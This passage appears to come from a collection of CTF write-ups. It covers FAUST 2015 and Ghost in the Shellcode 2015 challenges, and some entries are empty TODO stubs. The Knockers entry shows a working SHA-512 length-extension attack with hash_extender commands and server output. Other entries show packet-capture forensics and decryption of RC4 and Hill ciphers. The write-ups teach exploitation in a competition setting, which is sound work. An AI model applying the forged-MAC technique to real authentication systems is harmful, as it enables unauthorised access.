This code does not only plug the keyboard off and on again (;)), but it also annotates some PDF comments. Why would it do this? So let's have a look at `\avr@keyboard@plugin`:

	\def\avr@keyboard@plugoff{
		\edef\@tmp{\avrUDR}
		\edef\avr@keyboard@plugin{\expandafter\avr@keyboard@reset\@tmp\@nnil}
	}
	\def\avr@keyboard@plugin{eDRnil}
	\def\avr@keyboard@reset#1#2#3#4#5#6#7#8\@nnil{:#1:#2:#3:#4:#5:#6:#7:#8}

It looks like some override-thingy is going on, doing something with the `UDR` register - wait, that's the hash, right?

So the code generates for each flag a `AVR-Reset-done` tag with 8 nibbels appended - 4 bytes - the hash for each flag. These tags are stored in *EVERY* pdf.

### Exploiting
Straight forward:
 - Offer Satan your soul
 - Obtain your pdf
 - Get the 4 bytes hash for each flag
 - Download all the pdf's
 - ...
 - Profit
 - Repeat each round

## Other write-ups and resources

* none yet
# FAUST CTF 2015: wichteln

**Category:** Wichteln
**Points:** 
**Solves:** 
**Description:**



## Write-up

(TODO)

## Other write-ups and resources

* none yet
# Ghost in the Shellcode 2015: Knockers

**Category:** Crypto
**Points:** 150
**Description:**

> Dude, here's a knocker token that will let you access my service on port 80. One day I will let you see my cool stuff on port 7175.
> 
> Your token: 6e248dc3dec420c42f48f720475f9cb70f2485d8214715c66106050fd1a7b687326b2c82114419474042bb5df1602d578c059ba5dac260f644b8584dd5a0a38b0050
>
> Server: knockers.2015.ghostintheshellcode.com
>
> Knocker program: [source](knockers-28e0925c5d1a7e50f21a32e5448cf84a4216e46dbedbb2266fd8a)

## Write-up

by [miton](https://github.com/miton)

The service implements a form of [port knocking](http://en.wikipedia.org/wiki/Port_knocking). We are given a token that when provided to the service will allow our IP address to access certain ports on the server. However, it only allows us to access port 80 where there is a web server that taunts us and says the real goods are on port 7175. 

```
$ python knock.py knock knockers.2015.ghostintheshellcode.com 6e248dc3dec420c42f48f720475f9cb70f2485d8214715c66106050fd1a7b687326b2c82114419474042bb5df1602d578c059ba5dac260f644b8584dd5a0a38b0050

$ nc knockers.2015.ghostintheshellcode.com 80
GET / HTTP/1.0

HTTP/1.1 200 OK
Server: nginx/1.4.6 (Ubuntu)
Date: Sun, 18 Jan 2015 22:29:59 GMT
Content-Type: text/html
Content-Length: 329
Last-Modified: Fri, 16 Jan 2015 23:24:24 GMT
Connection: close
ETag: "54b99da8-149"
Accept-Ranges: bytes

<html>
<head><title>port 80 is for noobs</title></head>
<body>

<h1>Hello</h1>

<p>
I have been pwning noobs in a cool game at <a href="http://pwnadventure.com/">http://pwnadventure.com/</a>. When I'm not playing that, I enjoy the stuff on port 7175, but you will never see it!
</p><pre>

--computerality
</pre>

</body>
</html>
```

The source is provided for the port knocking server so:

```python
...
PORT = 8008

g_h = hashlib.sha512
g_key = None

def generate_token(h, k, *pl):
	m = struct.pack('!'+'H'*len(pl), *pl)
	mac = h(k+m).digest()
	return mac + m
...
```

The token consists of a [MAC](http://en.wikipedia.org/wiki/Message_authentication_code) and then some other data. Since [SHA-512](http://en.wikipedia.org/wiki/SHA-2) is 512 bits we know the token provided to us is really:

* MAC: 6e248dc3dec420c42f48f720475f9cb70f2485d8214715c66106050fd1a7b687326b2c82114419474042bb5df1602d578c059ba5dac260f644b8584dd5a0a38b
* data: 0050

Continuing on:

```python
def parse_and_verify(h, k, m):
	ds = h().digest_size
	if len(m) < ds:
		return None
	mac = m[:ds]
	msg = m[ds:]
	if h(k+msg).digest() != mac:
		return None
	port_list = []
	for i in range(0,len(msg),2):
		if i+1 >= len(msg):
			break
		port_list.append(struct.unpack_from('!H', msg, i)[0])
	return port_list
```
	
The data part of the token is just a list of ports with 2 bytes for each port in [big endian](http://en.wikipedia.org/wiki/Endianness). We still don't know where k in the MAC is coming from, but it is basically loaded from secret.txt so one last important bit:
	
```python
	elif sys.argv[1]=='setup':
		f = open('secret.txt','wb')
		f.write(hexlify(os.urandom(16)))
		f.close()
		print 'wrote new secret.txt'
```

So we need a token that is ```SHA-512(<secret><port_list>)<port_list>``` and the port list needs to contain 7175.  There isn't a way for us to leak the secret so we cannot generate a MAC for a different list of ports.

SHA-512 (and several other popular hash functions) are all based on a [Merkle–Damgård construction](http://en.wikipedia.org/wiki/Merkle%E2%80%93Damg%C3%A5rd_construction). Messages are padded to the size of blocks and the hash function has an intial state. A new internal state for the hash function is generated from the current state and a message block. The new state and the next message block are fed to the function again until all message blocks are processed. Once all of the message blocks are processed the state is output as the digest. This leads to a [length extension attack](http://en.wikipedia.org/wiki/Length_extension_attack), given the internal state of a hash we can compute the digest of messages that consist of the original message (plus padding) and any additonal blocks of our choosing.

Since we know that ```SHA-512(<secret><[80,]>)``` is really ```SHA-512(<secret><[80,]>||<padding>)``` and the state after computing it we can compute ```SHA-512(<secret><[80,]>||<padding>||<our_block>)``` without having to know ```<secret>``` provided we know how long ```<secret>``` is so we can generate the correct padding (or just guess the size until it works). We know it is 16 bytes long though so all we need is to do a little math.

Thankfully, [iagox86/hash_extender](https://github.com/iagox86/hash_extender) and [bwall/HashPump](https://github.com/bwall/HashPump) (and others) already do the drudge work for you so:

```
$ ./hash_extender -f sha512 --data-format=hex -d '0050' --append-format=hex -a '1c07' -l 16 -s '6e248dc3dec420c42f48f720475f9cb70f2485d8214715c66106050fd1a7b687326b2c82114419474042bb5df1602d578c059ba5dac260f644b8584dd5a0a38b'
Type: sha512
Secret length: 16
New signature: f11849ac29b10a169b8a378a84695ddf8d80c2e75f6e59e7de5a84a66e5c204efb1d3b2e486498d106b7236b7fbf23fefb7f3ce930c702c25ff5563bd596bea7
New string: 005080000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000901c07

$ python knocker.py knock knockers.2015.ghostintheshellcode.com f11849ac29b10a169b8a378a84695ddf8d80c2e75f6e59e7de5a84a66e5c204efb1d3b2e486498d106b7236b7fbf23fefb7f3ce930c702c25ff5563bd596bea7005080000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000901c07

$ nc knockers.2015.ghostintheshellcode.com 7175

```

From there just guess it is probably a web server:
```
$ nc knockers.2015.ghostintheshellcode.com 7175
GET / HTTP/1.1
Host: knockers.2015.ghostintheshellcode.com

HTTP/1.1 200 OK
Server: nginx/1.4.6 (Ubuntu)
Date: Sun, 18 Jan 2015 22:32:52 GMT
Content-Type: text/html
Transfer-Encoding: chunked
Connection: keep-alive

35e9
<html>
<head><title>Index of /</title></head>
<body bgcolor="white">
<h1>Index of /</h1><hr><pre><a href="../">../</a>
<a href="01.jpg">01.jpg</a>                                             16-Jan-2015 23:09              463525
<a href="02.jpg">02.jpg</a>                                             16-Jan-2015 23:09              497187
<a href="049057d53e832623ccca379ed973b0a3508b59a6.jpg">049057d53e832623ccca379ed973b0a3508b59a6.jpg</a>       16-Jan-2015 23:09              110853
<a href="0597c6407db43e06edd545ce4f6b6bad8140bdb1.jpg">0597c6407db43e06edd545ce4f6b6bad8140bdb1.jpg</a>       16-Jan-2015 23:09              320875
<a href="06febe0150ba0dd841870dd7be8a760c9ba2246d.jpg">06febe0150ba0dd841870dd7be8a760c9ba2246d.jpg</a>       16-Jan-2015 23:09               65929
<a href="0af086557a767bf077cda3c0d83dcece13681d25.jpg">0af086557a767bf077cda3c0d83dcece13681d25.jpg</a>       16-Jan-2015 23:09              313881
<a href="12c85be9090ff33d17c77031ddc69e4f7a2b5ff3.jpg">12c85be9090ff33d17c77031ddc69e4f7a2b5ff3.jpg</a>       16-Jan-2015 23:09               43869
<a href="14b7pr4.gif">14b7pr4.gif</a>                                        16-Jan-2015 23:09              592135
<a href="153798m.gif">153798m.gif</a>                                        16-Jan-2015 23:09              842651
<a href="15fb89d6d9f5ac1557526f96967af93aa43f7683.jpg">15fb89d6d9f5ac1557526f96967af93aa43f7683.jpg</a>       16-Jan-2015 23:09               29205
<a href="208cp00.jpg">208cp00.jpg</a>                                        16-Jan-2015 23:09              187045
<a href="20fp21j.jpg">20fp21j.jpg</a>                                        16-Jan-2015 23:09               48555
<a href="263tq86.jpg">263tq86.jpg</a>                                        16-Jan-2015 23:09              207498
<a href="2890deeb570020704f3b42eda4c1e27b640d8a94.jpg">2890deeb570020704f3b42eda4c1e27b640d8a94.jpg</a>       16-Jan-2015 23:09              176665
<a href="29669d7668ef4f361318481f66da7688c06cd653.jpg">29669d7668ef4f361318481f66da7688c06cd653.jpg</a>       16-Jan-2015 23:09               43613
<a href="29cd4697b327c7a63157101b90476387e412491e.jpg">29cd4697b327c7a63157101b90476387e412491e.jpg</a>       16-Jan-2015 23:09              379015
<a href="2fa7a64692c30622a75c0f98501ef9eaeab8b556.jpg">2fa7a64692c30622a75c0f98501ef9eaeab8b556.jpg</a>       16-Jan-2015 23:09               72995
<a href="2gybpko.jpg">2gybpko.jpg</a>                                        16-Jan-2015 23:09              492078
<a href="2qbcgb5.jpg">2qbcgb5.jpg</a>                                        16-Jan-2015 23:09              326193
<a href="2z57kt4.jpg">2z57kt4.jpg</a>                                        16-Jan-2015 23:09              585028
<a href="30cvqf8.jpg">30cvqf8.jpg</a>                                        16-Jan-2015 23:09              812538
<a href="34hi3vm.jpg">34hi3vm.jpg</a>                                        16-Jan-2015 23:09              237547
<a href="3ca0b624a4b028519bb7fe24b0f04fa93909112d.jpg">3ca0b624a4b028519bb7fe24b0f04fa93909112d.jpg</a>       16-Jan-2015 23:09               29919
<a href="3e64743aba691b40f39c540ad3426a26c2dbcdb6.jpg">3e64743aba691b40f39c540ad3426a26c2dbcdb6.jpg</a>       16-Jan-2015 23:09              212699
<a href="45fb2068727abd4a6240e5555ce4b7cf16ca1dc1.jpg">45fb2068727abd4a6240e5555ce4b7cf16ca1dc1.jpg</a>       16-Jan-2015 23:09               27940
<a href="474794b35915b0652075384565d89b3fb48d20dd.jpg">474794b35915b0652075384565d89b3fb48d20dd.jpg</a>       16-Jan-2015 23:09              183704
<a href="4eMo8.jpg">4eMo8.jpg</a>                                          16-Jan-2015 23:09               67914
<a href="5260bf1db426ddff1ebc330457c6ee87ccf954fb.jpg">5260bf1db426ddff1ebc330457c6ee87ccf954fb.jpg</a>       16-Jan-2015 23:09               46905
<a href="598c06f636802461702e0ff66cc2310576663691.jpg">598c06f636802461702e0ff66cc2310576663691.jpg</a>       16-Jan-2015 23:09              275011
<a href="5a71daade6e63a60e65b5b006ab2b956c0a0e936.jpg">5a71daade6e63a60e65b5b006ab2b956c0a0e936.jpg</a>       16-Jan-2015 23:09               34699
<a href="5c59cd71092ad4c8ee2c6279b88706698e4dc5f1.jpg">5c59cd71092ad4c8ee2c6279b88706698e4dc5f1.jpg</a>       16-Jan-2015 23:09               46321
<a href="71653dd60579dc0e17a4ebaebdbb989aeb397c1f.jpg">71653dd60579dc0e17a4ebaebdbb989aeb397c1f.jpg</a>       16-Jan-2015 23:09               54048
<a href="736ee9539439f9cdd1d1d53b9802d9b16aba2b22.jpg">736ee9539439f9cdd1d1d53b9802d9b16aba2b22.jpg</a>       16-Jan-2015 23:09               27449
<a href="77f52ba19b3627f1ee2bd329fe1b3203b43f537b.jpg">77f52ba19b3627f1ee2bd329fe1b3203b43f537b.jpg</a>       16-Jan-2015 23:09               44937
<a href="78de0adb46a92e6e639c3064ef01421735c781f0.jpg">78de0adb46a92e6e639c3064ef01421735c781f0.jpg</a>       16-Jan-2015 23:09               62668
<a href="7f2bf18158e5fee67794c8c5c574b23d0e7a111e.jpg">7f2bf18158e5fee67794c8c5c574b23d0e7a111e.jpg</a>       16-Jan-2015 23:09              496880
<a href="86f1ea8bc941a0d7494961c02dcd6e76269ebe09.jpg">86f1ea8bc941a0d7494961c02dcd6e76269ebe09.jpg</a>       16-Jan-2015 23:09               45411
<a href="87176_ChristinaHendricks_EsquireRussia_June2010_2_122_382lo.jpg">87176_ChristinaHendricks_EsquireRussia_June2010..&gt;</a> 16-Jan-2015 23:09              234399
<a href="88391_ChristinaHendricks_EsquireRussia_June2010_13_122_200lo.jpg">88391_ChristinaHendricks_EsquireRussia_June2010..&gt;</a> 16-Jan-2015 23:09               26455
<a href="8dfc04e737cd67bd001e2d9d6b1d8ed3ada98122.jpg">8dfc04e737cd67bd001e2d9d6b1d8ed3ada98122.jpg</a>       16-Jan-2015 23:09              105940
<a href="8ec9519b1ec4f837595c142b7a0a72ea1bf4da14.jpg">8ec9519b1ec4f837595c142b7a0a72ea1bf4da14.jpg</a>       16-Jan-2015 23:09               26692
<a href="96cdc9869ffd7da35db6367201c442afa560f728.jpg">96cdc9869ffd7da35db6367201c442afa560f728.jpg</a>       16-Jan-2015 23:09              210710
<a href="97b93a0bbae6bfdada860257b425a669e4210069.jpg">97b93a0bbae6bfdada860257b425a669e4210069.jpg</a>       16-Jan-2015 23:09               28277
<a href="9d62a3dd63964cc1dd483a9f84b40af103316e79.jpg">9d62a3dd63964cc1dd483a9f84b40af103316e79.jpg</a>       16-Jan-2015 23:09               40957
<a href="Christina-Hendricks-Esquire-Photoshoot-HQ-christina-hendricks-8730769-1085-1526.jpg">Christina-Hendricks-Esquire-Photoshoot-HQ-chris..&gt;</a> 16-Jan-2015 23:09              366473
<a href="ChristinaHendricks2.jpg">ChristinaHendricks2.jpg</a>                            16-Jan-2015 23:09               51203
<a href="ETCvSl.jpg">ETCvSl.jpg</a>                                         16-Jan-2015 23:09               86191
<a href="QroQy.jpg">QroQy.jpg</a>                                          16-Jan-2015 23:09              122664
<a href="Uqp3H.jpg">Uqp3H.jpg</a>                                          16-Jan-2015 23:09               69622
<a href="XKcgt.jpg">XKcgt.jpg</a>                                          16-Jan-2015 23:09               33167
<a href="a099360ff91b72f17d4e12528029c0d4ece2db7e.jpg">a099360ff91b72f17d4e12528029c0d4ece2db7e.jpg</a>       16-Jan-2015 23:09              145341
<a href="a31f08a40290aa75d479685c4d92a7be3dd3af4d.gif">a31f08a40290aa75d479685c4d92a7be3dd3af4d.gif</a>       16-Jan-2015 23:09              606838
<a href="a5ey6r.jpg">a5ey6r.jpg</a>                                         16-Jan-2015 23:09               27299
<a href="a6ce3916e4144924adefb907ea1bf487a4860ba5.jpg">a6ce3916e4144924adefb907ea1bf487a4860ba5.jpg</a>       16-Jan-2015 23:09              105846
<a href="attachment.php%3fattachmentid%3d736537">attachment.php?attachmentid=736537</a>                 16-Jan-2015 23:09              200955
<a href="attachment.php%3fpostid%3d375910557">attachment.php?postid=375910557</a>                    16-Jan-2015 23:09              200955
<a href="attachment.php%3fpostid%3d375924101">attachment.php?postid=375924101</a>                    16-Jan-2015 23:09              155807
<a href="attachment.php%3fpostid%3d375948751">attachment.php?postid=375948751</a>                    16-Jan-2015 23:09              279018
<a href="attachment.php%3fpostid%3d375948771">attachment.php?postid=375948771</a>                    16-Jan-2015 23:09              781178
<a href="attachment.php%3fpostid%3d377569452">attachment.php?postid=377569452</a>                    16-Jan-2015 23:09               25269
<a href="b6be647c5dd5995e56592bbc4be843d58b53009b.jpg">b6be647c5dd5995e56592bbc4be843d58b53009b.jpg</a>       16-Jan-2015 23:09               37789
<a href="b7d50fc6fadab52fbc12c5cc2b8e3b888ddcb8ab.jpg">b7d50fc6fadab52fbc12c5cc2b8e3b888ddcb8ab.jpg</a>       16-Jan-2015 23:09               26818
<a href="b8d9e40937f393c1bdfabed56d3ce33409d9ac4d.jpg">b8d9e40937f393c1bdfabed56d3ce33409d9ac4d.jpg</a>       16-Jan-2015 23:09               85049
<a href="bad33a2c7c952a1e287f5e0c13345f3960358202.jpg">bad33a2c7c952a1e287f5e0c13345f3960358202.jpg</a>       16-Jan-2015 23:09              227207
<a href="be8ccb4dc6a611e8ba944f97d09630dba501f3a1.jpg">be8ccb4dc6a611e8ba944f97d09630dba501f3a1.jpg</a>       16-Jan-2015 23:09              170859
<a href="becb11d47a65a22847fa2716e68170729eac4a49.jpg">becb11d47a65a22847fa2716e68170729eac4a49.jpg</a>       16-Jan-2015 23:09               25019
<a href="c126939f48bb995de9ed67aaec59a067f7b3f618.jpg">c126939f48bb995de9ed67aaec59a067f7b3f618.jpg</a>       16-Jan-2015 23:09               60828
<a href="c1cd1df7feb423b2f950757eb40f3fc2acdf7017.jpg">c1cd1df7feb423b2f950757eb40f3fc2acdf7017.jpg</a>       16-Jan-2015 23:09               58899
<a href="c9495809a73ba5b4e317c27c62e3c9ef0eaf3127.jpg">c9495809a73ba5b4e317c27c62e3c9ef0eaf3127.jpg</a>       16-Jan-2015 23:09               56751
<a href="c9d0f72c423b7b2f3f8291c13f08e7ceddc71ab0.jpg">c9d0f72c423b7b2f3f8291c13f08e7ceddc71ab0.jpg</a>       16-Jan-2015 23:09               87597
<a href="cc1ec381ccb0f12516103b6d5362891767810fff.jpg">cc1ec381ccb0f12516103b6d5362891767810fff.jpg</a>       16-Jan-2015 23:09              223826
<a href="ce35392ddb7f25d6f5c3ffe4d1c8e8905da7cf94.jpg">ce35392ddb7f25d6f5c3ffe4d1c8e8905da7cf94.jpg</a>       16-Jan-2015 23:09              122864
<a href="d474bb9a7e7900eed87718e1d98fa2862ca5b1b3.jpg">d474bb9a7e7900eed87718e1d98fa2862ca5b1b3.jpg</a>       16-Jan-2015 23:09               44671
<a href="d6e41da783fe73ae2e587faf05b9e51908f81a5b.jpg">d6e41da783fe73ae2e587faf05b9e51908f81a5b.jpg</a>       16-Jan-2015 23:09              474253
<a href="d732c58f03480f158930695f9be172d87723c1e1.jpg">d732c58f03480f158930695f9be172d87723c1e1.jpg</a>       16-Jan-2015 23:09               21088
<a href="da5baf89352ce35065131d499ae2c5b174b02f46.jpg">da5baf89352ce35065131d499ae2c5b174b02f46.jpg</a>       16-Jan-2015 23:09              330334
<a href="dm5vm8.jpg">dm5vm8.jpg</a>                                         16-Jan-2015 23:09              515344
<a href="e03c34b9549fec241d8a29c23ee0db470aa1c7b1.jpg">e03c34b9549fec241d8a29c23ee0db470aa1c7b1.jpg</a>       16-Jan-2015 23:09              246346
<a href="e5dd21632e3bb7851e93a0a59bed15a5b379703c.jpg">e5dd21632e3bb7851e93a0a59bed15a5b379703c.jpg</a>       16-Jan-2015 23:09              385784
<a href="eb26054e9f3817b6e2327e8fe881469143aa99b6.jpg">eb26054e9f3817b6e2327e8fe881469143aa99b6.jpg</a>       16-Jan-2015 23:09               73749
<a href="eed53c5a1127b218f9cf424e776137745478ef8d.jpg">eed53c5a1127b218f9cf424e776137745478ef8d.jpg</a>       16-Jan-2015 23:09               32904
<a href="f1c66aabecf538eabc7718e4a19e926b73f3b62a.jpg">f1c66aabecf538eabc7718e4a19e926b73f3b62a.jpg</a>       16-Jan-2015 23:09              273218
<a href="f7fbc15c75829f57fcbfc4c45d76aa53007c8908.jpg">f7fbc15c75829f57fcbfc4c45d76aa53007c8908.jpg</a>       16-Jan-2015 23:09               74894
<a href="f7zR4.jpg">f7zR4.jpg</a>                                          16-Jan-2015 23:09              102468
<a href="f85599cb374f74fc7176005556fe49dc5d08b09c.jpg">f85599cb374f74fc7176005556fe49dc5d08b09c.jpg</a>       16-Jan-2015 23:09               69120
<a href="fa23ec63568d591b1cc08c7e11a073ce83846941.jpg">fa23ec63568d591b1cc08c7e11a073ce83846941.jpg</a>       16-Jan-2015 23:09              342187
<a href="hendricks.jpg">hendricks.jpg</a>                                      16-Jan-2015 23:09               23665
<a href="jz8774.jpg.gif">jz8774.jpg.gif</a>                                     16-Jan-2015 23:09             1351611
<a href="k1ckgm.jpg">k1ckgm.jpg</a>                                         16-Jan-2015 23:09              191441
<a href="key.txt">key.txt</a>                                            16-Jan-2015 23:10                  39
<a href="n1JdM.jpg">n1JdM.jpg</a>                                          16-Jan-2015 23:09               77911
<a href="o9KBX.jpg">o9KBX.jpg</a>                                          16-Jan-2015 23:09              394726
<a href="qHChf.jpg">qHChf.jpg</a>                                          16-Jan-2015 23:09              114109
<a href="redheadboobies.jpg">redheadboobies.jpg</a>                                 16-Jan-2015 23:09               37797
<a href="uyQ1a.jpg">uyQ1a.jpg</a>                                          16-Jan-2015 23:09              128651
<a href="v91PO.jpg">v91PO.jpg</a>                                          16-Jan-2015 23:09               77387
<a href="w1qp84.jpg">w1qp84.jpg</a>                                         16-Jan-2015 23:09              335746
<a href="works7175.txt">works7175.txt</a>                                      16-Jan-2015 21:35                   8
<a href="yDVi0.jpg">yDVi0.jpg</a>                                          16-Jan-2015 23:09              458559
</pre><hr></body>
</html>

0

^C

$ wget -np -r http://knockers.2015.ghostintheshellcode.com:7175
...
Total wall clock time: 8.4s
Downloaded: 100 files, 19M in 6.7s (2.82 MB/s)

$ cat knockers.2015.ghostintheshellcode.com:7175/key.txt
the_snozberries_taste_like_snozberries

```

I actually had a harder time getting IPv6 working than solving the challenge as I was familiar with it, remembered when Flickr and a few other services had similiar vulnerabilities, and solved a [similar challenge in StripeCTF 2.0](https://github.com/stripe-ctf/stripe-ctf-2.0/tree/master/levels/7). 

Somehow I can connect to several IPv6 destinations, but not the knocker box. After spending way longer than I should have trying to fix that I just spun up a new ec2 instance and used [Hurricane Electric's](https://tunnelbroker.net/) [tunnel broker](http://en.wikipedia.org/wiki/IPv6_transition_mechanisms#Tunnel_broker). I saw a few similar complaints on IRC so IPv6 is clearly ready for the mainstream.

## Other write-ups and resources

* <http://blog.tinduong.pw/ghost-in-the-shellcode-2015-write-ups/>
* <https://blog.skullsecurity.org/2015/gits-2015-knockers-py-hash-extension-vulnerability>
* [French](https://t0x0sh.org/ghosts-in-the-shellcodes-2015-knockers-crypto-150.html)
* [German](https://cryto.org/writeup-ghost-in-the-shellcode-2015-crypto-150-knockers/)
# Ghost in the Shellcode 2015: MTGO

**Category:** Crypto
**Points:** 200
**Description:**

> Find the key!
> Server: mtgo.2015.ghostintheshellcode.com:7463
> File: [File](mtgo-ce275a1bd9684c5d6a6cb8d0e84f8a1c8845cdc545d52920f7978c1b8d9af383)

## Write-up

(TODO)

## Other write-ups and resources

* <http://0xa.li/ghost-in-the-shellcode-2015-ctf-mtgo-writeup/>
* <https://gist.github.com/sinfocol/87a3593f038984c9a549>
* [French](https://t0x0sh.org/ghosts-in-the-shellcodes-2015-mtgo-crypto-200.html)
# Ghost in the Shellcode 2015: Nikoli

**Category:** Crypto
**Points:** 250
**Description:**

> Find the key! ([File](nikoli-a1039901ded721abdf42e3003725abb265a70386e8b3292b0a4262eaf5693e5b))

## Write-up

by [polym](https://github.com/abpolym)

The archive contains two files [ciphertext.txt](ciphertext.txt) and [sudoku\_challenge.png](sudoku_challenge.png).

Solving the given sudoku with any online sudoku solver results in this [solution](solution).

The ciphertext is encrypted with a [Hill cipher](http://en.wikipedia.org/wiki/Hill\_cipher), they decryption key is the 3x3 block in the center of the solution.

Solving the Hill cipher with an online [service](https://cloud.sagemath.com/) results in the following cleartext:

> JACKANDJILLWENTUPTHEHILLTOFETCHAPAILOFWATERJACKFELLDOWNANDBROKEHISCROWNANDJILLCAMETUMBLINGAFTERTHEFLAGISCYMOPOLEIA

The python script using the sage libraries is [here](sage_decrypt.py).

I also wrote the encryption/decryption algorithmn in python [here](hilly.py).

## Other write-ups and resources

* <http://blog.tinduong.pw/ghost-in-the-shellcode-2015-write-ups/>
# Ghost in the Shellcode 2015: Vig128

**Category:** Crypto
**Points:** 128
**Description:**

> Find the key!
> Server: vig128.2015.ghostintheshellcode.com:1280

## Write-up

(TODO)

## Other write-ups and resources

* [Sourcecode](https://github.com/LightningTH/GiTS/tree/master/2015/vig128)
# Ghost in the Shellcode 2015: Cloudfs

**Category:** Forensics
**Points:** 200
**Description:**

> Find the key! ([File](cloudfs-31c938df3531611b82fddf0685784a2b67373305ec689015f193a555b756beb2))

## Write-up

by [boogy](https://github.com/boogy)

The file we were given if a pcapng file. To be able to read'it with scapy we need to convert it to pcap. The easiest way is to use tcpdump as so:

```bash
tcpdump -r cloudfs-31c938df3531611b82fddf0685784a2b67373305ec689015f193a555b756beb2 -w cloudfs.pcap
```

Use scapy to extract all icmp packets:

```python
#!/usr/bin/env python
# -\*- coding: utf-8 -\*-
from scapy.all import *

r = rdpcap("cloudfs.pcap")
l = len(r)
print l
D = []
for i in range(0, l):
    if ICMP in r[i]:
        print 'OK'
        print r[i][ICMP].summary()
        if r[i][ICMP].type == 8 : # ICMP request
            d = str(r[i][Raw]).encode('hex')
            if d not in D:
                D.append(d)
f = open('flag.bin', 'w')
f.write(''.join(D))
f.close()
```
Convert the flag.bin hex to binary in another file named *flag* and use binwalk to extract the archive:

```bash
$ binwalk flag
DECIMAL           HEX               DESCRIPTION
-------------------------------------------------------------------------------------------------------
1480              0x5C8             bzip2 compressed data, block size = 900k
````
```bash
$ binwalk --dd='.*' -e flag
````
We have a *5C8* file which we'll rename in key.
```bash
$ file 5C8
    5C8: POSIX tar archive (GNU)
````
Rename the file and add .tar extension to it and extract:

```bash
$ mv 5C8 key.tar
$ tar xf key.tar
$ cat key
$ key{WhyWouldYouEverUseThis}
````
So the flag is: **key{WhyWouldYouEverUseThis}**

## Alternate Writeup

by [reap-](https://github.com/reap-)

**forensics/CloudFS** - Ghost in the shell code 2015

On initial investigation I noticed there were 4 differant ICMP request ID's with 1066 bytes of data.

ID's in order being: 0x0d00, 0x0e00, 0x0f00, 0x1000

In the first ICMP request there was a bz2 file header after the first 32 bytes of ICMP request.

42 5a 68 39 31 41 59 26 53 59 | BZh91AY&SY

Copy the hex data and paste it into a hex editor for each of the unique ICMP requests using the data after the inital 32 bytes.

once all pasted and the bz2 file recompiled 

Uncompress it and find "key" which included the **flag: key{WhyWouldYouEverUseThis}**
along with a copy of the python script used to create the challenge.

I'm sure there was an easier way to do this with automation but this seemed to work for me.

## Other write-ups and resources

* <http://blog.reverser.ninja/2015/01/ghost-in-shellcode-2015-cloudfs-writeup.html>
* <http://0xa.li/ghost-in-the-shellcode-2015-ctf-cloudfs-writeup/>
* <http://blog.tinduong.pw/ghost-in-the-shellcode-2015-write-ups/>
* <http://0x1337seichi.wordpress.com/2015/01/18/ghost-in-the-shellcode-2015-cloudfs-writeup/>
* <http://labs.jumpsec.com/2015/01/19/ghost-shellcode-2015-ctf-write-cloudfs-challenge/>
* <https://ctf-team.vulnhub.com/ghost-in-the-shellcode-2015-cloudfs/>
# Ghost in the Shellcode 2015: Portal2

**Category:** Forensics
**Points:** 400
**Description:**

> Find the key! ([File](https://2015.ghostintheshellcode.com/portal2-3580e93204cc7605c204e3a1b77e378165eb455ca46746825167c7f22bd8af5b)

[Alternative download](https://mega.nz/#!fMMAgZYQ!rSwSArMdGaZng-e9RHP3SwG5-R4c5i1q_iQuU-gl1bE)

## Write-up

(TODO)

## Other write-ups and resources

* [Sourcecode](https://github.com/LightningTH/GiTS/tree/master/2015/Portal2)
# Ghost in the Shellcode 2015: Rubicon

**Category:** Forensics
**Points:** 400
**Description:**

> You're a special agent, find the culprit! ([File](https://2015.ghostintheshellcode.com/rubicon-fb6dec9f517e171a15c4b3a63cc7c9ce1cc1141fdf0e23b5b377ebd305f7c8d6))

[Alternative download](https://mega.nz/#!KVlBGDSJ!QyaSTaCVW2fiDtq4NLDGSDUgxN-WDtf6aNwm_me96wo)

## Write-up

by [polym](https://github.com/abpolym)

Exracting the given xz compressed file, we receive one file, `rubicon`:
```
$ file rubicon
rubicon: tcpdump capture file (little-endian) - version 2.4 (Ethernet, capture length 65535)
```

After opening this capture file into `wireshark` and applying the ftp filter to it, we see this exchange:

![pic](1.png)

We notice that an ftp server requires a password for the USER "lolcats" and after exchanging a 16 byte RC4 key, specified after `Tx:`, the following packets between `172.32.0.208` and `172.30.0.32` seem to be encrypted.

We are exporting these packet bytes via `wireshark` as `tx.bin` and remove the preceding `Tx:` with `tail -c+4 tx.bin > tx` to get the RC4 key to decrypt data coming from `172.32.0.208`.

After that, we are extracting the ftp stream up until the last encrypted response packet:

![pic2](2.png)

Now we are converting the `stream` to a postscript continous hexdump with `xxd -p stream > stream.xxd` and remove the ftp layer bytes of those packets, which are specifying either the RC4 key (first one) or the sizes of the following response packets (notice the packets with size `70`):

![pic3](3.png)

After we've stripped these bytes from `stream.xxd`, we convert the hexdump again to binary using `xxd -r -p stream.xxd > sstream`.

We are decrypting this binary with `openssl rc4 -in sstream -out decrypt -K "$(xxd -p ./tx)"` and open `decrypt` with `vim` in binary mode:

    ..
    .
    04c.jpg
    102123_story__Kim-Jong-Un-Meme-1.jpg
    102123_story__kim-jong-un-strikes-againc1135735.jpg
    56989-3bpblogspotcom-yEGK.jpeg
    851ddb44a6149fab434818d8c4749e5a9c92f3bcef00c412b7d8d7a1680205fe.jpg
    DPRK.jpg
    DdXFIBF.jpg
    Kim Jong Un.jpg
    Rodman-Obama.jpg
    Screen-Shot-2013-04-07-at-7.52.56-AM.png
    U7DyCGI.jpg
    YdrNUe2.gif
    Z64DiyY.jpg
    barack-obama-kim-jong-un-north-korea-Favim.com-676362.jpg
    creepy.gif
    enhanced-buzz-17889-1365786077-4.jpg
    enhanced-buzz-3756-1365173359-18.jpg
    funny-picture-kim-jong-un-playing-with-star-wars-toys.jpg
    h35F2F219.jpg
    ibjVDu095O1f0T.gif
    kim-jong-un-1-million-likes.jpg
    kim-jong-un-eats-a-snickers_zpsafe724b0.jpg
    kim-jong-un-needs-his-nuclear-bomb-badge_o_1135698.jpg
    kim-jong-un-really-likes-cake.gif
    kim-jong-un-snickers.jpeg
    kim-jong.jpg
    kim_jong_un_fat_meme_i11.jpg
    kim_jong_un_learns_the_computer_540.jpg
    maxresdefault.jpg
    post-4263-I-expect-nothing-and-still-Im-OPyw.gif
    tfcORkb.jpg
    thumb.jpg
    tumblr_mduho91ART1qz97cwo1_500.gif
    
    real    0m5.010s
    user    0m0.001s
    sys     0m0.003s^_<8b>^H^@ɞ<a5>T^@^C<[more non-ascii characters...]
    
